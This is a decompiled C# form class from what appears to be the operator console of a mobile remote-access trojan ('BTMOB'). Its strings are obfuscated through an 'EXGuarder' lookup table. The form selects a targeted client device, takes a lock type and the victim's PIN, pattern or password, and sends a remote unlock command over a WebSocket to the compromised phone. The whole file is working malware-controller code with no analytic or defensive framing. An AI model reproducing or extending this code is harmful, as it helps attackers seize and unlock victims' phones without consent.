using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class autounlock : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("nobtn")]
	private DrakeUIButtonIcon _nobtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("okbtn")]
	private DrakeUIButtonIcon _okbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("comboTargts")]
	private DrakeUIComboBox _comboTargts;

	public BTClient BTcli;

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon nobtn
	{
		[CompilerGenerated]
		get
		{
			return _nobtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = nobtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _nobtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_nobtn = value;
			drakeUIButtonIcon = _nobtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon okbtn
	{
		[CompilerGenerated]
		get
		{
			return _okbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = okbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _okbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_okbtn = value;
			drakeUIButtonIcon = _okbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel44")]
	internal virtual Panel Panel44
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctrtext")]
	internal virtual DrakeUISymbolLabel ctrtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("inputtext2")]
	internal virtual DrakeUITextBox inputtext2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lcktyplbl")]
	internal virtual DrakeUISymbolLabel lcktyplbl
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox comboTargts
	{
		[CompilerGenerated]
		get
		{
			return _comboTargts;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = comboTargts_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _comboTargts;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_comboTargts = value;
			drakeUIComboBox = _comboTargts;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.autounlock));
		this.Panel2 = new System.Windows.Forms.Panel();
		this.nobtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.okbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel44 = new System.Windows.Forms.Panel();
		this.ctrtext = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.inputtext2 = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.lcktyplbl = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.comboTargts = new DrakeUI.Framework.DrakeUIComboBox();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.Panel44.SuspendLayout();
		this.Panel3.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(321, 5);
		this.minibtn.Location = new System.Drawing.Point(363, 5);
		this.closbtn.Location = new System.Drawing.Point(405, 5);
		this.myico.Image = BTMOB.My.Resources.Resources.unlokapp;
		this.mytitle.Size = new System.Drawing.Size(437, 19);
		this.tobpanelsti.Size = new System.Drawing.Size(447, 29);
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.nobtn);
		this.Panel2.Controls.Add(this.okbtn);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel2.Location = new System.Drawing.Point(2, 216);
		this.Panel2.Name = EXGuarder._436D5B64;
		this.Panel2.Padding = new System.Windows.Forms.Padding(10);
		this.Panel2.Size = new System.Drawing.Size(447, 51);
		this.Panel2.TabIndex = 40;
		this.Panel2.Controls.SetChildIndex(this.okbtn, 0);
		this.Panel2.Controls.SetChildIndex(this.nobtn, 0);
		this.nobtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.nobtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.nobtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.nobtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.nobtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.Font = new System.Drawing.Font(EXGuarder._3B1F1E5B, 10f);
		this.nobtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nobtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nobtn.Location = new System.Drawing.Point(117, 10);
		this.nobtn.Name = EXGuarder._2A2B425F;
		this.nobtn.Radius = 15;
		this.nobtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.nobtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.nobtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.nobtn.Size = new System.Drawing.Size(160, 31);
		this.nobtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.nobtn.Symbol = 61453;
		this.nobtn.SymbolSize = 20;
		this.nobtn.TabIndex = 44;
		this.nobtn.Text = EXGuarder._75050C21;
		this.okbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.okbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.okbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.okbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.okbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.Font = new System.Drawing.Font(EXGuarder._3B1F1E5B, 10f);
		this.okbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.okbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.okbtn.Location = new System.Drawing.Point(277, 10);
		this.okbtn.Name = EXGuarder._40735A76;
		this.okbtn.Radius = 15;
		this.okbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.okbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.okbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.okbtn.Size = new System.Drawing.Size(160, 31);
		this.okbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.okbtn.SymbolSize = 20;
		this.okbtn.TabIndex = 43;
		this.okbtn.Text = EXGuarder._6D611558;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(249, 10);
		this.DrakeWidth_W2.Name = EXGuarder._34604436;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(28, 31);
		this.DrakeWidth_W2.TabIndex = 5;
		this.Panel44.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel44.Controls.Add(this.ctrtext);
		this.Panel44.Controls.Add(this.inputtext2);
		this.Panel44.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel44.Location = new System.Drawing.Point(2, 112);
		this.Panel44.Name = EXGuarder._46467767;
		this.Panel44.Padding = new System.Windows.Forms.Padding(9);
		this.Panel44.Size = new System.Drawing.Size(447, 42);
		this.Panel44.TabIndex = 50;
		this.ctrtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.ctrtext.Font = new System.Drawing.Font(EXGuarder._3B1F1E5B, 9f);
		this.ctrtext.ForeColor = System.Drawing.Color.White;
		this.ctrtext.Location = new System.Drawing.Point(9, 9);
		this.ctrtext.Name = EXGuarder._0D542B6A;
		this.ctrtext.Padding = new System.Windows.Forms.Padding(29, 0, 0, 0);
		this.ctrtext.Size = new System.Drawing.Size(226, 24);
		this.ctrtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.ctrtext.Symbol = 61508;
		this.ctrtext.SymbolColor = System.Drawing.Color.White;
		this.ctrtext.SymbolSize = 25;
		this.ctrtext.TabIndex = 17;
		this.ctrtext.Text = EXGuarder._30722C16;
		this.ctrtext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.inputtext2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.inputtext2.Dock = System.Windows.Forms.DockStyle.Right;
		this.inputtext2.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.inputtext2.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.inputtext2.Font = new System.Drawing.Font(EXGuarder._3B1F1E5B, 9f);
		this.inputtext2.ForeColor = System.Drawing.Color.White;
		this.inputtext2.Location = new System.Drawing.Point(235, 9);
		this.inputtext2.Margin = new System.Windows.Forms.Padding(4);
		this.inputtext2.Maximum = 2147483647.0;
		this.inputtext2.Minimum = -2147483648.0;
		this.inputtext2.Name = EXGuarder._2E701538;
		this.inputtext2.Padding = new System.Windows.Forms.Padding(4);
		this.inputtext2.Radius = 15;
		this.inputtext2.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.inputtext2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.inputtext2.Size = new System.Drawing.Size(203, 25);
		this.inputtext2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.inputtext2.TabIndex = 19;
		this.inputtext2.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.inputtext2.Watermark = EXGuarder._6013376E;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.lcktyplbl);
		this.Panel3.Controls.Add(this.comboTargts);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(2, 67);
		this.Panel3.Name = EXGuarder._73445F2B;
		this.Panel3.Padding = new System.Windows.Forms.Padding(9);
		this.Panel3.Size = new System.Drawing.Size(447, 45);
		this.Panel3.TabIndex = 51;
		this.lcktyplbl.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lcktyplbl.Font = new System.Drawing.Font(EXGuarder._3B1F1E5B, 9f);
		this.lcktyplbl.ForeColor = System.Drawing.Color.White;
		this.lcktyplbl.Location = new System.Drawing.Point(9, 9);
		this.lcktyplbl.Name = EXGuarder._641E435C;
		this.lcktyplbl.Padding = new System.Windows.Forms.Padding(29, 0, 0, 0);
		this.lcktyplbl.Size = new System.Drawing.Size(226, 27);
		this.lcktyplbl.Style = DrakeUI.Framework.UIStyle.Custom;
		this.lcktyplbl.Symbol = 61573;
		this.lcktyplbl.SymbolColor = System.Drawing.Color.White;
		this.lcktyplbl.SymbolSize = 25;
		this.lcktyplbl.TabIndex = 18;
		this.lcktyplbl.Text = EXGuarder._0E352F04;
		this.lcktyplbl.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.comboTargts.Dock = System.Windows.Forms.DockStyle.Right;
		this.comboTargts.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboTargts.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.comboTargts.Font = new System.Drawing.Font(EXGuarder._3B1F1E5B, 9f);
		this.comboTargts.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.comboTargts.Items.AddRange(new object[3]
		{
			EXGuarder._74027569,
			EXGuarder._3B555158,
			EXGuarder._14006E6A
		});
		this.comboTargts.Location = new System.Drawing.Point(235, 9);
		this.comboTargts.Margin = new System.Windows.Forms.Padding(4);
		this.comboTargts.MinimumSize = new System.Drawing.Size(56, 0);
		this.comboTargts.Name = EXGuarder._1D643F35;
		this.comboTargts.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboTargts.Radius = 15;
		this.comboTargts.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comboTargts.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboTargts.Size = new System.Drawing.Size(203, 25);
		this.comboTargts.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboTargts.TabIndex = 2;
		this.comboTargts.Text = EXGuarder._74027569;
		this.comboTargts.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(451, 269);
		base.Controls.Add(this.Panel44);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel2);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._1272236D);
		base.Name = EXGuarder._6F1E4D61;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = EXGuarder._6F1E4D61;
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		base.Controls.SetChildIndex(this.Panel44, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.Panel44.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public autounlock(BTClient Targetcli)
	{
		base.Load += autounlock_Load;
		InitializeComponent();
		BTcli = Targetcli;
	}

	private void translateme()
	{
		object value = BTRegistry.GetValue(EXGuarder._47291620, EXGuarder._5D4D4855);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._4768510C, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._2941682A;
			lcktyplbl.Text = EXGuarder._2D781A5A;
			okbtn.Text = EXGuarder._0E2D6169;
			nobtn.Text = EXGuarder._262B0E23;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._713A4301, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._45026826;
			lcktyplbl.Text = EXGuarder._7562583B;
			okbtn.Text = EXGuarder._08446C0F;
			nobtn.Text = EXGuarder._18676A66;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._31334370, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._5E156259;
			lcktyplbl.Text = EXGuarder._410E4745;
			okbtn.Text = EXGuarder._61063069;
			nobtn.Text = EXGuarder._03437871;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._1A071738, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._4A1C526C;
			lcktyplbl.Text = EXGuarder._76270F16;
			okbtn.Text = EXGuarder._14784443;
			nobtn.Text = EXGuarder._6D676600;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._10706509, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._1F361968;
			lcktyplbl.Text = EXGuarder._1E740A05;
			okbtn.Text = EXGuarder._6C322A68;
			nobtn.Text = EXGuarder._3F315913;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._414A5845, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._3B74700F;
			lcktyplbl.Text = EXGuarder._59095834;
			okbtn.Text = EXGuarder._6C322A68;
			nobtn.Text = EXGuarder._3F315913;
		}
	}

	private void autounlock_Load(object sender, EventArgs e)
	{
		mytitle.Text = BTConst.autounlockstr + EXGuarder._4B6E4E29 + BTcli.name;
		myico.Image = BTcli.wallpaper;
		myscr.Image = Resources.unlokapp;
	}

	private void comboTargts_SelectedIndexChanged(object sender, EventArgs e)
	{
		inputtext2.Text = EXGuarder._724B0955;
	}

	private void nobtn_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.Abort;
		Close();
	}

	private void okbtn_Click(object sender, EventArgs e)
	{
		if (codes.StrisEmpty(inputtext2.Text))
		{
			BTAlerter.Warnings(BTConst.nopassunlockstr);
			return;
		}
		string value = EXGuarder._095E186F;
		string text = inputtext2.Text;
		string left = comboTargts.Text;
		if (Operators.CompareString(left, EXGuarder._55071554, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._07517742, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._74686911, TextCompare: false) == 0)
				{
					value = EXGuarder._16620157;
				}
			}
			else
			{
				value = EXGuarder._4E70154D;
				if (!codes.StrisEmpty(text) && text.Length != 4 && text.Length != 6)
				{
					BTAlerter.infos(BTConst.pintypsstr);
					return;
				}
			}
		}
		else
		{
			value = EXGuarder._095E186F;
			if (!codes.StrisEmpty(text) && ((text.Length < 4) | (text.Length > 9)))
			{
				BTAlerter.infos(BTConst.pintypsstr);
				return;
			}
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._4F5F1E4B, EXGuarder._13540A01);
		dictionary.Add(EXGuarder._68583949, text);
		dictionary.Add(EXGuarder._5A323275, value);
		dictionary.Add(EXGuarder._37195E5A, EXGuarder._72360B1C);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, BTcli.mobid, BTcli.Serverins.WSClient);
	}
}
